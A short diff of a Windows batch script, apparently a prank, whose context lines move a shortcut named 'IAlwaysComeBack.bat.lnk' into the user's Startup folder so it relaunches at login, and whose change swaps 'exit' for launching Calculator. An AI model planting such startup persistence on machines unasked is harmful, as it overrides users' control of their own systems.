@@ -8,4 +8,5 @@ if exist "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" (
 	move "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 )
 
-exit
+cd "..\Desktop\"
+start Calculator.exe
